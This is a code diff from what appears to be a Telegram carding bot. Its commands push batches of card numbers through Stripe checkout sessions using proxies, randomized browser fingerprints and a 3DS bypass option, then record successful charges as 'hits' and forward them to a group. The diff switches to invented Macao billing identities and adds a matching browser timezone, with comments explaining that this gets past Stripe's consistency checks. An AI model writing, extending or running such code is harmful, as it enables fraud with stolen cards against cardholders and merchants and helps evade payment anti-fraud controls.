-            progress_text += _stco_live_body(live_results)
-            progress_text += f"{_stco_card_line(card)}\n"
-            progress_text += f"    ⤷ {pe(PREMIUM_EMOJI_IDS['time'], '⏳')} <b>Processing...</b>"
+            progress_text += f"{pe(PREMIUM_EMOJI_IDS['stats'], '📊')} <b>Progress</b> ➳ {idx-1}/{len(cards)}\n\n"
+            progress_text += f" {card.get('cc', '')}|{card.get('month', '')}|{card.get('year', '')}|{card.get('cvv', '')}\n"
+            progress_text += f"    ⤷ {pe(PREMIUM_EMOJI_IDS['time'], '⏳')} Processing..."
             
             await progress_msg.edit_text(progress_text, parse_mode=ParseMode.HTML)
         except:
@@ -19467,7 +18958,6 @@ async def stco_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         print(f"🔄 Processing card {idx}/{len(cards)}")
         
         # ============ PASS SESSION DATA TO CHARGE FUNCTION ============
-        _stco_mark(f"card{idx}_charge_start")
         result = await charge_single_card_stco(
             card, 
             checkout_data, 
@@ -19476,8 +18966,6 @@ async def stco_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             bypass_3ds, 
             max_retries=3
         )
-        _stco_mark(f"card{idx}_charge_done",
-                   f"{result.get('status')} in {result.get('time')}s")
         results.append(result)
         
         # Build card string for display
@@ -19496,26 +18984,8 @@ async def stco_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             'attempts': len(result.get('attempts', []))
         })
         
-        # Append this card's verdict to the live progress body (same format
-        # as the final "Stripe Charge Result" box).
-        _st_emoji, _st_label = _stco_status_badge(result.get('status', 'UNKNOWN'))
-        _st_resp = result.get('response') or result.get('status') or 'Unknown'
-        _live_line = f"{_stco_card_line(card_str)}\n    ⤷ {_st_emoji} <b>{_st_resp} ({_st_label})</b>"
-        _live_attempts = len(result.get('attempts', []))
-        if _live_attempts > 0:
-            _live_line += f" <b>[attempts: {_live_attempts}]</b>"
-        live_results.append(_live_line + "\n")
-
         print(f"📊 Result: {result.get('status', 'UNKNOWN')} - {result.get('response', 'Unknown')[:50]}")
-
-        # ── Fatal checkout error: stop, the session is gone ──────────────
-        # e.g. "This Checkout Session is no longer active." — hitting the
-        # remaining cards is pointless, so end the run here.
-        if _stco_is_dead_session(result):
-            _stopped_dead_session = True
-            print("🛑 [stco] Checkout session is no longer active — stopping run")
-            break
-
+        
         if result['status'] == 'CHARGED':
             charged_card = result
             charged_card_data = {
@@ -19535,31 +19005,28 @@ async def stco_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     response += f"┃ {pe(PREMIUM_EMOJI_IDS['diamond'], '💳')} <b>Stripe Charge Result</b>\n"
     response += f"┗━━━━━━━━━━━⊛\n\n"
     
-    response += f"{pe(PREMIUM_EMOJI_IDS['globe'], '🌐')} <b>Site</b> ➳ <b>{merchant_name}</b>\n"
-    response += f"{pe(PREMIUM_EMOJI_IDS['money'], '💰')} <b>Amount</b> ➳ <b>{price_display}</b>\n"
+    response += f"{pe(PREMIUM_EMOJI_IDS['globe'], '🌐')} <b>Site</b> ➳ {merchant_name}\n"
+    response += f"{pe(PREMIUM_EMOJI_IDS['money'], '💰')} <b>Amount</b> ➳ {price_display}\n"
     
     if charged_card:
-        response += f"{pe(PREMIUM_EMOJI_IDS['charged'], '🔥')} <b>Status</b> ➳ <b>Paid ✅</b>\n"
+        response += f"{pe(PREMIUM_EMOJI_IDS['charged'], '🔥')} <b>Status</b> ➳ Paid ✅\n"
     else:
-        response += f"{pe(PREMIUM_EMOJI_IDS['declined'], '❌')} <b>Status</b> ➳ <b>Not Paid</b>\n"
+        response += f"{pe(PREMIUM_EMOJI_IDS['declined'], '❌')} <b>Status</b> ➳ Not Paid\n"
     
     if success_url:
-        response += f"{pe(PREMIUM_EMOJI_IDS['target'], '🎯')} <b>Success Url</b> ➳ <a href=\"{success_url}\"><b>CLICK</b></a>\n"
+        response += f"{pe(PREMIUM_EMOJI_IDS['target'], '🎯')} <b>Success Url</b> ➳ <a href=\"{success_url}\">CLICK</a>\n"
     
-    response += f"{pe(PREMIUM_EMOJI_IDS['stats'], '📊')} <b>Progress</b> ➳ <b>{len(results)}/{len(cards)}</b>\n\n"
-    
-    if _stopped_dead_session:
-        response += f"{pe(PREMIUM_EMOJI_IDS['warning'], '⚠️')} <b>Stopped</b> ➳ <b>Checkout session is no longer active</b>\n\n"
+    response += f"{pe(PREMIUM_EMOJI_IDS['stats'], '📊')} <b>Progress</b> ➳ {len(results)}/{len(cards)}\n\n"
     
     # Show results
     if charged_card:
-        response += f"{_stco_card_line(charged_card['card_display'])}\n"
-        response += f"    ⤷ {pe(PREMIUM_EMOJI_IDS['charged'], '🔥')} <b>{charged_card['response']} ✅</b>\n"
+        response += f" {charged_card['card_display']}\n"
+        response += f"    ⤷ {pe(PREMIUM_EMOJI_IDS['charged'], '🔥')} {charged_card['response']} ✅\n"
         for r in results:
             if r != charged_card:
-                response += f"{_stco_card_line(r['card_display'])}\n"
+                response += f" {r['card_display']}\n"
                 status_text = r['response'] if r['response'] else r['status']
-                response += f"    ⤷ {pe(PREMIUM_EMOJI_IDS['declined'], '❌')} <b>{status_text}</b>\n"
+                response += f"    ⤷ {pe(PREMIUM_EMOJI_IDS['declined'], '❌')} {status_text}\n"
     else:
         for r in card_results:
             card = r['card']
@@ -19567,261 +19034,50 @@ async def stco_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             response_text = r['response']
             attempts = r.get('attempts', 0)
             
-            status_emoji, status_display = _stco_status_badge(status)
+            if status == '3DS' or status == '3DS SKIP':
+                status_emoji = pe(PREMIUM_EMOJI_IDS['lock'], '🔐')
+                status_display = "3DS required"
+            elif status == 'DECLINED':
+                status_emoji = pe(PREMIUM_EMOJI_IDS['declined'], '❌')
+                status_display = "declined"
+            elif status == 'NOT SUPPORTED':
+                status_emoji = pe(PREMIUM_EMOJI_IDS['warning'], '⚠️')
+                status_display = "not supported"
+            elif status == 'CHARGED':
+                status_emoji = pe(PREMIUM_EMOJI_IDS['charged'], '🔥')
+                status_display = "charged ✅"
+            elif status == 'SESSION_ERROR':
+                status_emoji = pe(PREMIUM_EMOJI_IDS['warning'], '⚠️')
+                status_display = "session expired"
+            elif status == 'INSUFFICIENT_FUNDS':
+                status_emoji = pe(PREMIUM_EMOJI_IDS['money'], '💰')
+                status_display = "insufficient funds"
+            elif status == 'CVV_LIVE':
+                status_emoji = pe(PREMIUM_EMOJI_IDS['approved'], '✅')
+                status_display = "cvv live"
+            elif status == 'TIMEOUT':
+                status_emoji = pe(PREMIUM_EMOJI_IDS['time'], '⏰')
+                status_display = "timeout"
+            elif status == 'PROXY_ERROR':
+                status_emoji = pe(PREMIUM_EMOJI_IDS['error'], '🔌')
+                status_display = "proxy error"
+            else:
+                status_emoji = pe(PREMIUM_EMOJI_IDS['error'], '⚠️')
+                status_display = status
             
-            response += f"{_stco_card_line(card)}\n"
-            response += f"    ⤷ {status_emoji} <b>{response_text} ({status_display})</b>"
+            response += f" {card}\n"
+            response += f"    ⤷ {status_emoji} {response_text} ({status_display})"
             if attempts > 0:
-                response += f" <b>[attempts: {attempts}]</b>"
+                response += f" [attempts: {attempts}]"
             response += "\n"
 
-    # ── STAGE TRACE: stamp the end of the run and attach the debug block ──
-    _response_core = response
-    _trace = _stco_trace()
-    if _trace is not None:
-        # Capture the aborting stage BEFORE stamping run_finished, otherwise
-        # the fast-exit warning would always blame "run_finished".
-        _fast_exit = _trace.is_fast_exit
-        _abort_stage = _trace.last_stage
-        _elapsed_s = _trace.elapsed
-        _stco_mark("run_finished",
-                   f"{len(results)}/{len(cards)} checked, "
-                   f"{'CHARGED' if charged_card else 'no hit'}")
-        if _fast_exit:
-            print(
-                "⚡ [STCO-TRACE] FAST EXIT: finished in "
-                f"{_elapsed_s:.2f}s with NO /confirm request sent — "
-                f"aborted at stage '{_abort_stage}'. "
-                "Check the stage timings above for the culprit."
-            )
-        response += _trace.reply_block()
-
-    # Telegram caps a message at 4096 chars — drop the trace block if needed.
-    if len(response) > 4000:
-        response = _response_core
-
-    try:
-        await progress_msg.edit_text(response, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
-    except Exception as _edit_err:
-        # The trace footer must never cost the user their result card.
-        print(f"⚠️ [stco] final edit failed ({_edit_err}) — retrying without trace block")
-        await progress_msg.edit_text(_response_core, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
-    
-    # ============ SEND HIT NOTIFICATION IF CHARGED ============
-    if charged_card_data and not hit_notifications_muted(user_id):
-        try:
-            # Get user data
-            user_data = user_manager.get_user(user_id)
-            username = update.effective_user.username or user_data.get('username', 'Unknown')
-            first_name = update.effective_user.first_name or 'User'
-            
-            # ============ SEND NOTIFICATION WITH BLADESARKS BUTTON ============
-            if HIT_NOTIFICATION_ENABLED:
-                # Premium emojis for notification
-                diamond_emoji = pe(PREMIUM_EMOJI_IDS.get("diamond", "5427168083074628963"), "💎")
-                charged_emoji = pe(PREMIUM_EMOJI_IDS.get("charged", "5039670412733055750"), "🔥")
-                
-                # ============ BLADESARKS BUTTON - LIKE SHOPIFY ============
-                keyboard = [
-                    [
-                        InlineKeyboardButton("BLADESARKS", url="https://t.me/BLADESARKS_v4_bot", style='primary', icon_custom_emoji_id="5427168083074628963"),
-                    ]
-                ]
-                reply_markup = InlineKeyboardMarkup(keyboard)
-                
-                notification = (
-                    f"<b>Stripe Checkout</b>\n"
-                    f"<b>Amount</b> ➛ {charged_card_data['price']}\n"
-                    f"{charged_emoji} <b>Payment Successful</b>\n"
-                    f"<b>User</b> ➛ @{username}"
-                )
-                
-                # Send to your group with BUTTON
-                try:
-                    await context.bot.send_message(
-                        chat_id=HIT_NOTIFICATION_GROUP_ID,
-                        text=notification,
-                        parse_mode="HTML",
-                        reply_markup=reply_markup  # <-- ADDED BUTTON HERE
-                    )
-                    print(f"✅ Stripe hit notification sent with BLADESARKS button")
-                except Exception as e:
-                    print(f"❌ Failed to send notification: {e}")
-                    
-            # Get BIN info for the card
-            bin_info = await get_bin_info(charged_card_data['card'])
-            
-            # Save hit to file
-            await save_hit_to_file(
-                card=charged_card_data['card'],
-                gateway="Stripe Checkout",
-                response=charged_card_data['response'],
-                price=charged_card_data['price'],
-                bin_info=bin_info,
-                user_id=user_id,
-                user_tier=user_manager.get_tier(user_id)
-            )
-            
-            user_manager.increment_hits(user_id)
-            
-        except Exception as e:
-            print(f"⚠️ [HIT NOTIFICATION] Error: {e}")
-            
-        # ============ SEND TO HIT FORWARDER ============
-        try:
-            asyncio.create_task(
-                send_hit_to_forwarder(
-                    card=charged_card_data['card'],
-                    gateway="Stripe Checkout",
-                    response=charged_card_data['response'],
-                    price=charged_card_data['price'],
-                    bin_info=bin_info if 'bin_info' in locals() else None,
-                    user_id=user_id,
-                    user_tier=user_manager.get_tier(user_id),
-                    status_category="charged"
-                )
-            )
-        except Exception as e:
-            print(f"⚠️ [HIT FORWARDER] Error: {e}")
+    await progress_msg.edit_text(response, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
 
 
-# ══════════════════════════════════════════════════════════════════
-#  /stcodiag  —  preflight-only diagnostic for /stco
-#
-#  Runs EXACTLY the same Stripe calls /stco runs before it hits a card
-#  (URL decode → session fetch → display init → fresh init) but charges
-#  nothing. Each stage is timed, so if /stco answers in 1-2s you can see
-#  which call returned instantly and why.
-# ══════════════════════════════════════════════════════════════════
-async def stcodiag_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Time every /stco preflight stage without charging a card."""
-    user_id = update.effective_user.id
-    message = update.effective_message
 
-    reply_url = None
-    try:
-        if message.reply_to_message:
-            reply_url = _stco_extract_url_from_message(message.reply_to_message)
-    except Exception:
-        reply_url = None
 
-    args = [str(a) for a in (context.args or [])]
-    url = None
-    if args and extract_checkout_url(args[0]):
-        url = extract_checkout_url(args[0])
-    elif reply_url:
-        url = reply_url
-    elif args:
-        url = args[0].strip()
 
-    if not url:
-        await message.reply_text(
-            "🧭 <b>/stcodiag</b>\n\n"
-            "Times every /stco preflight stage without charging a card.\n\n"
-            "Usage: <code>/stcodiag &lt;checkout_url&gt;</code>\n"
-            "Or reply to a message containing a Stripe URL.",
-            parse_mode=ParseMode.HTML,
-        )
-        return
 
-    total_t0 = time.perf_counter()
-    lines = ["🧭 <b>/stco preflight diag</b>", ""]
-
-    proxy_raw = None
-    try:
-        proxy_raw = get_stco_proxy(user_id)
-    except Exception as e:
-        lines.append(f"🔌 proxy resolve failed: {html.escape(str(e)[:60])}")
-    lines.append(
-        f"🔌 <b>Proxy</b> ➳ "
-        f"{'yes (' + html.escape(mask_proxy_stco(proxy_raw)) + ')' if proxy_raw else 'DIRECT'}"
-    )
-
-    def _stage(idx, label, ms, ok, note=""):
-        badge = "✅" if ok else "❌"
-        line = f"{idx} {label} ➳ <b>{_stco_fmt_ms(ms)}</b> {badge}"
-        if note:
-            line += f" <i>{html.escape(str(note)[:90])}</i>"
-        lines.append(line)
-
-    # ── 1. decode URL ────────────────────────────────────────────────
-    t = time.perf_counter()
-    checkout_data = await get_checkout_info_stco(url)
-    checkout_data["raw_url"] = url
-    ms = (time.perf_counter() - t) * 1000
-    ok = bool(checkout_data.get("is_valid"))
-    _stage("1️⃣", "decode URL", ms, ok, checkout_data.get("error") or "")
-
-    if not ok:
-        lines += ["", "🛑 <b>Stopped</b> — PK/CS could not be decoded from the URL."]
-        await message.reply_text("\n".join(lines), parse_mode=ParseMode.HTML)
-        return
-
-    cs = checkout_data.get("cs")
-    pk = checkout_data.get("pk")
-    lines.append(f"    <code>cs={html.escape(str(cs))[:40]}…</code>")
-
-    # ── 2. session fetch (used for the customer email) ───────────────
-    t = time.perf_counter()
-    session_data = await get_checkout_session_stco(cs, pk, proxy_raw)
-    ms = (time.perf_counter() - t) * 1000
-    _stage("2️⃣", "session fetch", ms, bool(session_data),
-           "empty body" if not session_data else
-           f"email={'yes' if session_data.get('customer_email') else 'no'}")
-
-    # ── 3. display info (DIRECT httpx init, no proxy) ────────────────
-    t = time.perf_counter()
-    display_info = await get_checkout_info_display(url)
-    ms = (time.perf_counter() - t) * 1000
-    _stage("3️⃣", "display init (direct)", ms,
-           bool(display_info.get("is_valid")), display_info.get("error") or "")
-
-    # ── 4. fresh init (curl_cffi, with proxy — what charge uses) ─────
-    proxy_fmt = format_proxy_stco(proxy_raw) if proxy_raw else None
-    t = time.perf_counter()
-    _fpk, _fcs, fresh_init, init_resp = await get_fresh_stripe_checkout_data(
-        cs, pk, proxy_fmt
-    )
-    ms = (time.perf_counter() - t) * 1000
-    init_err = ""
-    if not fresh_init:
-        if isinstance(init_resp, dict):
-            init_err = (init_resp.get("error")
-                        or init_resp.get("body", "")[:90]
-                        or f"status {init_resp.get('status')}")
-        else:
-            init_err = str(init_resp)[:90]
-    _stage("4️⃣", "fresh init (curl_cffi)", ms, bool(fresh_init), init_err)
-
-    total_ms = (time.perf_counter() - total_t0) * 1000
-
-    lines += [""]
-    if fresh_init:
-        acc = fresh_init.get("account_settings", {}) or {}
-        merchant = acc.get("display_name") or acc.get("business_name") or "Unknown"
-        lig = fresh_init.get("line_item_group") or {}
-        amount = lig.get("total", 0) or 0
-        lines.append(
-            f"🏪 <b>{html.escape(str(merchant)[:40])}</b> · "
-            f"{amount / 100:.2f} {html.escape(str(lig.get('currency', '') or '').upper())}"
-        )
-        lines.append("🟢 <b>Preflight OK</b> — /stco would send a /confirm here.")
-    else:
-        lines.append(
-            "🔴 <b>Preflight FAILS at fresh init</b> — /stco aborts before "
-            "ever sending /confirm, which is why it answers in ~1s."
-        )
-
-    lines += ["", f"⏱ <b>Total</b> ➳ <b>{_stco_fmt_ms(total_ms)}</b>"]
-
-    try:
-        await message.reply_text(
-            "\n".join(lines)[:4000],
-            parse_mode=ParseMode.HTML,
-            disable_web_page_preview=True,
-        )
-    except Exception as e:
-        await message.reply_text(f"🧭 diag render error: {str(e)[:80]}")
 
 
 
@@ -28021,8 +27277,12 @@ def generate_elements_session_id():
 def generate_elements_config_id():
     return f"{random.randint(1,999)}-{random.randint(1,999)}-{random.randint(1,999)}-{random.randint(1,999)}"
 
-def rand_profile():
+def rand_profile(major=None):
     chrome = random.choice(CHROME_VERSIONS)
+    if major:
+        _m = [c for c in CHROME_VERSIONS if c["major"] == str(major)]
+        if _m:
+            chrome = _m[0]
     plat_ua, plat_name = random.choice(PLATFORMS)
     lang = random.choice(ACCEPT_LANGS)
     sjs = random.choice(STRIPE_JS_VERSIONS)
@@ -28037,55 +27297,49 @@ def rand_profile():
         "chrome_full": chrome["full"],
     }
 
+MACAO_STREETS = [
+    "Main Street", "Oak Road", "Park Avenue", "Maple Drive", "Cedar Lane",
+    "Pine Street", "Lake Drive", "Forest Avenue", "River Road", "Hill Street",
+]
+
+
 def generate_fresh_billing_details():
     """Generate fresh billing details for Stripe Checkout"""
     
     first_names = [
-        'James', 'John', 'Robert', 'Michael', 'William', 'David', 'Richard',
-        'Joseph', 'Thomas', 'Charles', 'Christopher', 'Daniel', 'Matthew',
-        'Anthony', 'Mark', 'Donald', 'Steven', 'Paul', 'Andrew', 'Joshua',
-        'Emma', 'Olivia', 'Ava', 'Isabella', 'Sophia', 'Charlotte', 'Mia',
-        'Amelia', 'Harper', 'Evelyn', 'Abigail', 'Emily', 'Elizabeth', 'Mila',
-        'Ella', 'Avery', 'Sofia', 'Camila', 'Aria', 'Scarlett', 'Raman',
-        'Rahul', 'Rahul1', 'Raman1', 'Rahul2', 'Raman2', 'Rahul3', 'Raman3',
-        'Rahul4', 'Raman4', 'Rahul5', 'Raman5', 'Rahul6', 'Raman6', 'Rahul7',
-        'Raman7', 'Rahul8', 'Raman8', 'Rahul9', 'Raman9', 'Rahul10', 'Raman10',
-        'Rahul11', 'Raman11', 'Rahul12', 'Raman12', 'Rahul13', 'Raman13',
-        'Rahul14', 'Raman14', 'Rahul15', 'Raman15', 'Rahul16', 'Raman16',
-        'Rahul17', 'Raman17', 'Rahul18', 'Raman18', 'Rahul19', 'Raman19',
-        'Rahul20', 'Raman20', 'Rahul21', 'Raman21', 'Rahul22', 'Raman22',
-        'Rahul23', 'Raman23', 'Rahul24', 'Raman24', 'Rahul25', 'Raman25',
-        'Rahul26', 'Raman26', 'Rahul27', 'Raman27', 'Rahul28', 'Raman28',
-        'Rahul29', 'Raman29', 'Rahul30', 'Raman30',
+        'Jeena', 'Ruhi', 'Nail', 'Aisha', 'Sana', 'Priya', 'Ananya', 'Meera',
+        'Zara', 'Laila', 'Noor', 'Amara', 'Fatima', 'Mariam', 'Yasmin', 'Leila',
+        'Sofia', 'Elena', 'Lucia', 'Camila', 'Valentina', 'Isabella', 'Mia',
+        'Ava', 'Emma', 'Olivia', 'Chloe', 'Nadia', 'Rania', 'Dalia', 'Hana',
+        'Yuna', 'Mei', 'Ling', 'Xiu', 'Jia', 'Anh', 'Linh', 'Mai', 'Thao',
+        'Nia', 'Imani', 'Zuri', 'Aaliyah', 'Naomi', 'Ruth', 'Grace', 'Hope',
+        'Joy', 'Ella', 'Clara', 'Alice', 'Julia', 'Nora', 'Eva', 'Iris',
+        'Ruby', 'Daisy', 'Lily', 'Sara', 'Lina', 'Maya', 'Tara', 'Nisha',
+        'Daniel', 'Arjun', 'Rohan', 'Karan', 'Aditya', 'Vikram', 'Aman',
+        'Farhan', 'Imran', 'Zaid', 'Omar', 'Yusuf', 'Karim', 'Tariq', 'Ali',
+        'Hassan', 'Ibrahim', 'Mateo', 'Diego', 'Lucas', 'Gabriel', 'Leo',
+        'Adam', 'Noah', 'Ethan', 'Owen', 'Ryan', 'Sean', 'Marco', 'Luca',
+        'Andre', 'Paulo', 'Joao', 'Miguel', 'Pedro', 'Kenji', 'Haruto', 'Wei',
+        'Jun', 'Minh', 'Duc', 'Kwok', 'Cheong', 'Ieong', 'Sou', 'Kin',
     ]
     
     last_names = [
-        'Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller',
-        'Davis', 'Rodriguez', 'Martinez', 'Hernandez', 'Lopez', 'Gonzalez',
-        'Wilson', 'Anderson', 'Thomas', 'Taylor', 'Moore', 'Jackson', 'Martin',
-        'Lee', 'Perez', 'Thompson', 'White', 'Harris', 'Sanchez', 'Clark',
-        'Ramirez', 'Lewis', 'Robinson', 'Walker', 'Young', 'Allen', 'King',
-        'Wright', 'Scott', 'Torres', 'Nguyen', 'Hill', 'Flores', 'Green',
-        'Adams', 'Nelson', 'Baker', 'Hall', 'Rivera', 'Campbell', 'Mitchell',
-        'Carter', 'Roberts', 'Turner', 'Phillips', 'Evans', 'Collins', 'Edwards',
-        'Stewart', 'Morris', 'Murphy', 'Cook', 'Rogers', 'Morgan', 'Peterson',
-        'Cooper', 'Reed', 'Bailey', 'Bell', 'Howard', 'Ward', 'Cox', 'Diaz',
-        'Richardson', 'Wood', 'Watson', 'Brooks', 'Bennett', 'Gray', 'James',
-        'Reyes', 'Cruz', 'Hughes', 'Price', 'Myers', 'Long', 'Foster', 'Sanders',
-        'Ross', 'Powell', 'Sullivan', 'Russell', 'Ortiz', 'Jenkins', 'Perry',
-        'Butler', 'Barnes', 'Fisher', 'Henderson', 'Coleman', 'Simmons',
-        'Patterson', 'Jordan', 'Reynolds', 'Hamilton', 'Graham', 'Kim',
-        'Gonzales', 'Alexander', 'Ramsey', 'Raman', 'Raman1', 'Raman2',
-        'Raman3', 'Raman4', 'Raman5', 'Raman6', 'Raman7', 'Raman8', 'Raman9',
-        'Raman10', 'Raman11', 'Raman12', 'Raman13', 'Raman14', 'Raman15',
-        'Raman16', 'Raman17', 'Raman18', 'Raman19', 'Raman20', 'Raman21',
-        'Raman22', 'Raman23', 'Raman24', 'Raman25', 'Raman26', 'Raman27',
-        'Raman28', 'Raman29', 'Raman30', 'Rahul', 'Rahul1', 'Rahul2', 'Rahul3',
-        'Rahul4', 'Rahul5', 'Rahul6', 'Rahul7', 'Rahul8', 'Rahul9', 'Rahul10',
-        'Rahul11', 'Rahul12', 'Rahul13', 'Rahul14', 'Rahul15', 'Rahul16',
-        'Rahul17', 'Rahul18', 'Rahul19', 'Rahul20', 'Rahul21', 'Rahul22',
-        'Rahul23', 'Rahul24', 'Rahul25', 'Rahul26', 'Rahul27', 'Rahul28',
-        'Rahul29', 'Rahul30',
+        'Ortega', 'Fisher', 'Silva', 'Costa', 'Pereira', 'Rodrigues',
+        'Fernandes', 'Santos', 'Oliveira', 'Souza', 'Lima', 'Almeida',
+        'Carvalho', 'Gomes', 'Martins', 'Lopes', 'Nascimento', 'Ribeiro',
+        'Araujo', 'Barbosa', 'Chan', 'Wong', 'Lei', 'Ho', 'Lam', 'Ng', 'Tam',
+        'Cheung', 'Choi', 'Fong', 'Kuan', 'Ieong', 'Sou', 'Sio', 'Lao',
+        'Khan', 'Ahmed', 'Hussain', 'Rahman', 'Sheikh', 'Malik', 'Qureshi',
+        'Patel', 'Sharma', 'Verma', 'Reddy', 'Nair', 'Menon', 'Iyer',
+        'Kapoor', 'Chopra', 'Bhatt', 'Joshi', 'Desai', 'Smith', 'Johnson',
+        'Brown', 'Miller', 'Davis', 'Wilson', 'Taylor', 'Moore', 'Clark',
+        'Hall', 'Young', 'King', 'Wright', 'Green', 'Baker', 'Adams',
+        'Nelson', 'Hill', 'Campbell', 'Mitchell', 'Garcia', 'Martinez',
+        'Lopez', 'Gonzalez', 'Perez', 'Sanchez', 'Ramirez', 'Torres',
+        'Flores', 'Rivera', 'Cruz', 'Reyes', 'Mendoza', 'Castillo', 'Vargas',
+        'Romero', 'Tan', 'Lim', 'Lee', 'Nguyen', 'Tran', 'Pham', 'Kim',
+        'Park', 'Sato', 'Suzuki', 'Takahashi', 'Watanabe', 'Chen', 'Wang',
+        'Li', 'Zhang', 'Liu', 'Huang', 'Wu',
     ]
     
     domains = [
@@ -28169,15 +27423,29 @@ def generate_fresh_billing_details():
     
     email = f"{first_name.lower()}.{last_name.lower()}{random.randint(10, 9999)}@{random.choice(domains)}"
     
-    street_num = random.randint(100, 99999)
-    street = random.choice(street_names)
+    # Billing profile mirrored from the working autofill extension:
+    #   address-line1 = "<rand 1-999> <US street>"
+    #   locality      = "Macau"
+    #   postal-code   = "999078"
+    #   country       = "MO"  (Macao SAR China)
+    street_num = random.randint(1, 999)
+    street = random.choice(MACAO_STREETS)
     address = f"{street_num} {street}"
-    
-    # Weighted country selection (80% US, 20% others)
-    country = random.choices(countries, weights=[0.8, 0.05, 0.05, 0.05, 0.01, 0.01, 0.01, 0.01, 0.01, 0.01, 0.01, 0.01, 0.01, 0.01, 0.01])[0]
-    
+
+    # ══════════════════════════════════════════════════════════════════
+    #  BILLING COUNTRY — fixed to Macao SAR China (MO)
+    #  Macao has no postal-code system: 999078 is the conventional
+    #  placeholder most processors accept, and "Macau" doubles as the
+    #  state/region and the city.
+    # ══════════════════════════════════════════════════════════════════
+    country = "MO"
+
     # Generate city, state, zip based on country
-    if country == "US":
+    if country == "MO":
+        city = "Macau"
+        state = "Macau"
+        zip_code = "999078"
+    elif country == "US":
         city, state, zip_list = random.choice(cities_states_zips[:30])
         zip_code = random.choice(zip_list)
     elif country == "GB":
@@ -28213,7 +27481,8 @@ def generate_fresh_billing_details():
         state = random.choice(["NH", "BRU", "ZH", "AB", "OSL", "CPH", "UUS"])
         zip_code = f"{random.randint(1000, 99999)}"
     
-    phone = f"+1{random.randint(200, 999)}{random.randint(100, 999)}{random.randint(1000, 9999)}"
+    # Macao mobile numbers: +853 6XXXXXXX (8 digits, mobile prefix 6)
+    phone = f"+853 6{random.randint(1000000, 9999999)}"
     
     return {
         "first_name": first_name,
@@ -28405,7 +27674,12 @@ async def get_fresh_stripe_checkout_data(cs: str, pk: str, proxy_url: str = None
     try:
         debug_print(3, f"📡 Fetching fresh init data for CS: {cs[:30]}...")
         
-        body = f"key={pk}&eid=NA&browser_locale=en-US&redirect_type=url"
+        # The working browser extension sends browser_timezone on init.
+        # Stripe compares it with the request IP country, so keep it in the
+        # same region as the billing country (MO) unless overridden.
+        _tz = (os.getenv("STCO_BROWSER_TZ", "") or "Asia/Macau").strip()
+        body = (f"key={pk}&eid=NA&browser_locale=en-US"
+                f"&browser_timezone={_tz}&redirect_type=url")
         
         debug_print(4, f"📤 Request URL: https://api.stripe.com/v1/payment_pages/{cs}/init")
         debug_print(4, f"📤 Request body: {body[:100]}...")
@@ -28791,7 +28065,7 @@ async def charge_card_stripe(card, checkout_data: dict, proxy_str: str = None, b
             debug_print(2, f"🔄 Attempt {attempt + 1}/{max_retries + 1}")
             debug_print(3, f"💳 Card: {cc[:6]}****** | {month}/{year} | CVV: {cvv}")
             
-            fp = rand_profile()
+            fp = rand_profile(STCO_UA_MAJOR)
             guid = generate_guid()
             muid = generate_muid()
             sid = generate_sid()
@@ -28943,6 +28217,7 @@ async def charge_card_stripe(card, checkout_data: dict, proxy_str: str = None, b
                     content=body
                 )
                 conf = response.json()
+            _stco_log_confirm_response(response, conf)
             
             debug_print(3, f"📥 Confirm response status: {response.status_code}")
             debug_print(4, f"📥 Confirm response: {json.dumps(conf, indent=2)[:1000]}...")
@@ -29259,8 +28534,17 @@ async def co_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "globe": "5447410659077661506",
     }
     
+    # Custom-emoji tags only render when the bot owns those emoji IDs.
+    # When it doesn't, Telegram drops the whole <tg-emoji> tag and the icon
+    # disappears ("┃ Stripe Charge Result" with no 💳, " Site ➳" with no 🌐).
+    # Plain emoji always render, so that is the default here.
+    # Set STCO_EMOJI_TAGS=1 to go back to premium <tg-emoji> tags.
+    _stco_premium_emoji = _stco_env_flag("STCO_EMOJI_TAGS", "1")
+
     def pe(emoji_id, fallback):
-        return f'<tg-emoji emoji-id="{emoji_id}">{fallback}</tg-emoji>'
+        if _stco_premium_emoji:
+            return f'<tg-emoji emoji-id="{emoji_id}">{fallback}</tg-emoji>'
+        return fallback
     
     text = message.text or ""
     lines = text.strip().split('\n')
@@ -29464,7 +28748,7 @@ async def co_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     # Build response - with safe None handling
     response = f"┏━━━━━━━⍟\n"
-    response += f"┃ {pe(PREMIUM_EMOJI_IDS['diamond'], '💳')} <b>Stripe Charge Result</b>\n"
+    response += f"┃ {pe(PREMIUM_EMOJI_IDS['diamond'], '💎')} <b>STRIP_HITTER</b>\n"
     response += f"┗━━━━━━━━━━━⊛\n\n"
     
     response += f"{pe(PREMIUM_EMOJI_IDS['globe'], '🌐')} <b>Site</b> ➳ {merchant_name}\n"
@@ -70370,6 +69654,7 @@ async def autosopi_mass_check_logic(update: Update, context: ContextTypes.DEFAUL
                     return False
 
                 # ── BIN info ─────────────────────────────────────────
+                bin_info = None
                 try:
                     bin_info = await get_bin_info(card, u_id)
                     if bin_info and len(bin_info) >= 3:
@@ -70379,6 +69664,14 @@ async def autosopi_mass_check_logic(update: Update, context: ContextTypes.DEFAUL
                 except Exception as e:
                     print(f"⚠️ BIN lookup error for {card[:20]}: {e}")
                     bin_text, bank, country = "N/A", "Unknown", "Unknown"
+
+                # Keep the FULL 5-tuple (bin, bank, country, currency,
+                # COUNTRY CODE). This used to be rebuilt with a hardcoded
+                # "USD"/"US" when the hit was forwarded, so every non-US card
+                # showed the 🇺🇸 flag in the scrape feed — e.g. an Axis Bank
+                # India BIN (IN) rendered as "🇺🇸 INDIA".
+                if not (isinstance(bin_info, (tuple, list)) and len(bin_info) == 5):
+                    bin_info = (bin_text, bank, country, "USD", "US")
 
                 if bank is None:
                     bank = "Unknown"
@@ -70489,7 +69782,7 @@ async def autosopi_mass_check_logic(update: Update, context: ContextTypes.DEFAUL
                         response=clean_response,
                         price=price_str,
                         user=user_data,
-                        bin_info=(bin_text, bank, country, "USD", "US"),
+                        bin_info=bin_info,
                         status_category=hit_category,
                     )
 
